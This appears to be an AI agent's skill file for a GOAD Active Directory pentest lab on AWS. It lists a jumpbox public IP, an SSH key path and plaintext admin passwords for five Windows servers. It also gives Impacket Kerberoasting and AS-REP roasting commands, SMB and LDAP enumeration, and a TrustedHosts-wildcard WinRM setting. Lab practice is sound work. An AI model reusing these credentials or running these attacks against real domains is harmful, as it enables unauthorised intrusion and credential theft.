---
name: goad
description: GOAD (Game of Active Directory) lab environment — AWS-based Active Directory pentest lab with 1 Ubuntu jumpbox and 5 Windows Server VMs (2 forests, 3 domains). Provides SSH/WinRM access, Ansible playbooks, server configs, and credentials for AD security testing, lateral movement practice, and Kerberos attacks.
---

# GOAD — Game of Active Directory Lab

AWS-hosted Active Directory pentest lab with multi-forest, multi-domain topology for practicing AD attacks, lateral movement, and Kerberos exploitation.

## Network Topology

```
Internet → Jumpbox (15.188.19.167) → Private Subnet (192.168.56.0/24)
                                        ├── DC01  (192.168.56.10)  sevenkingdoms.local        [PDC]
                                        ├── DC02  (192.168.56.11)  north.sevenkingdoms.local  [Child DC]
                                        ├── DC03  (192.168.56.12)  essos.local                [Separate forest]
                                        ├── SRV02 (192.168.56.22)  north.sevenkingdoms.local  [Member]
                                        └── SRV03 (192.168.56.23)  essos.local                [Member]
```

## Server Configuration

### Jumpbox (Ubuntu 22.04)

| Property | Value |
|----------|-------|
| Hostname | `ip-192-168-56-100` |
| Public IP | `15.188.19.167` |
| Private IP | `192.168.56.100` |
| SSH Key | `cyberagent/GOAD/workspace/03ea37-goad-aws/ssh_keys/ubuntu-jumpbox.pem` |
| Ansible | ✅ Configured |
| Dependencies | ✅ Installed |
| Source Code | ✅ Synchronized |

**SSH Access:**
```bash
ssh -i cyberagent/GOAD/workspace/03ea37-goad-aws/ssh_keys/ubuntu-jumpbox.pem ubuntu@15.188.19.167
```

**Privesc to root:**
```bash
sudo -i
```

**Tunnel Windows hosts through jumpbox:**
```bash
# Forward WinRM (5985/5986) for a target through the jumpbox
ssh -i cyberagent/GOAD/workspace/03ea37-goad-aws/ssh_keys/ubuntu-jumpbox.pem \
    -L 5985:192.168.56.10:5985 \
    ubuntu@15.188.19.167
```

### Windows Servers

| Server | Private IP | OS | Future Domain | Future Role | WinRM |
|--------|-----------|-----|---------------|-------------|-------|
| DC01 | 192.168.56.10 | Win Server 2019 Datacenter | sevenkingdoms.local | Primary DC | ✅ |
| DC02 | 192.168.56.11 | Win Server 2019 Datacenter | north.sevenkingdoms.local | Child DC | ✅ |
| DC03 | 192.168.56.12 | Win Server 2016 Datacenter | essos.local | Forest DC | ✅ |
| SRV02 | 192.168.56.22 | Win Server 2019 Datacenter | north.sevenkingdoms.local | Member | ✅ |
| SRV03 | 192.168.56.23 | Win Server 2016 Datacenter | essos.local | Member | ✅ |

All servers currently in **WORKGROUP** (not yet domain-joined).

### Credentials

| Server | Username | Password |
|--------|----------|----------|
| DC01 | goadmin | `8dCT-DJjgScp` |
| DC02 | goadmin | `NgtI75cKV+Pu` |
| DC03 | goadmin | `Ufe-bVXSx9rk` |
| SRV02 | goadmin | `NgtI75cKV+Pu` |
| SRV03 | goadmin | `978i2pF43UJ-` |

## WinRM Connection

Use the `pywinrm` skill or direct WinRM from the jumpbox:

```bash
# From jumpbox — test WinRM connectivity
python3 -c "
import winrm
s = winrm.Session('192.168.56.10', auth=('goadmin', '8dCT-DJjgScp'))
r = s.run_cmd('hostname')
print(r.std_out.decode())
"

# Or via pywinrm skill (handles tunneling automatically)
# Target: 192.168.56.10, User: goadmin, Password: 8dCT-DJjgScp
```

## Ansible Provisioning

The GOAD environment uses Ansible playbooks to provision the AD lab. From the jumpbox:

```bash
# Navigate to the GOAD workspace
cd ~/cyberagent/GOAD/workspace/03ea37-goad-aws/

# Check inventory
cat inventory

# Run the GOAD provisioning playbook
ansible-playbook -i inventory goad.yml

# Or run specific roles
ansible-playbook -i inventory --tags ad goad.yml
```

## Attack Paths (Post-Provisioning)

Once the AD environment is provisioned, these are the key attack surfaces:

1. **sevenkingdoms.local** → **north.sevenkingdoms.local** (parent → child trust)
2. **essos.local** (separate forest, forest trust possible)
3. **Kerberoasting** across all SPNs
4. **AS-REP Roasting** for pre-auth disabled accounts
5. **Lateral movement** via pass-the-hash / overpass-the-hash
6. **ACL abuse** (GenericAll, WriteDacl, ForceChangePassword)
9. **GPO abuse** for privilege escalation
10. **Constrained delegation** paths between domains
11. **SQL Server** exploitation on member servers
12. **WinRM** for remote PowerShell execution

## Useful Commands

### From Jumpbox — Port Scanning

```bash
# Quick scan of all Windows hosts
for ip in 10 11 12 22 23; do
  echo "=== 192.168.56.$ip ==="
  nmap -sV -p 88,135,139,389,445,636,3389,5985,5986 192.168.56.$ip
done
```

### Kerberos Enumeration (from jumpbox with Impacket)

```bash
# Get TGT for a domain user
getTGT.py sevenkingdoms.local/goadmin:'8dCT-DJjgScp' -dc-ip 192.168.56.10

# Enumerate users via Kerberos
GetNPUsers.py sevenkingdoms.local/ -usersfile users.txt -dc-ip 192.168.56.10

# AS-REP roast
GetNPUsers.py sevenkingdoms.local/ -dc-ip 192.168.56.10 -request

# Kerberoast
GetUserSPNs.py sevenkingdoms.local/goadmin:'8dCT-DJjgScp' -dc-ip 192.168.56.10 -request
```

### SMB Enumeration

```bash
# Null session check
smbclient -L //192.168.56.10 -N

# With credentials
smbclient -L //192.168.56.10 -U 'sevenkingdoms.local/goadmin%8dCT-DJjgScp'

# Enumerate shares across all hosts
for ip in 10 11 12 22 23; do
  echo "=== 192.168.56.$ip ==="
  smbclient -L //192.168.56.$ip -U 'goadmin%<password>' 2>/dev/null
done
```

### LDAP Enumeration

```bash
# LDAP search
ldapsearch -x -H ldap://192.168.56.10 -D 'goadmin@sevenkingdoms.local' -w '8dCT-DJjgScp' \
  -b 'DC=sevenkingdoms,DC=local' '(objectClass=user)' sAMAccountName
```

## Troubleshooting

### WinRM Connection Failed

```bash
# From jumpbox, test WinRM with curl
curl -k -u goadmin:'8dCT-DJjgScp' \
  http://192.168.56.10:5985/wsman -d '' -H "Content-Type: application/soap+xml"

# If WinRM not listening, enable via AWS Systems Manager:
aws ssm send-command \
  --instance-ids <instance-id> \
  --document-name "AWS-RunPowerShellScript" \
  --parameters 'commands=["Enable-PSRemoting -Force","Set-Item WSMan:\\localhost\\Client\\TrustedHosts * -Force"]'
```

### SSH to Jumpbox Failed

```bash
# Verify key permissions
chmod 400 cyberagent/GOAD/workspace/03ea37-goad-aws/ssh_keys/ubuntu-jumpbox.pem

# Connect with verbose output
ssh -v -i cyberagent/GOAD/workspace/03ea37-goad-aws/ssh_keys/ubuntu-jumpbox.pem ubuntu@15.188.19.167
```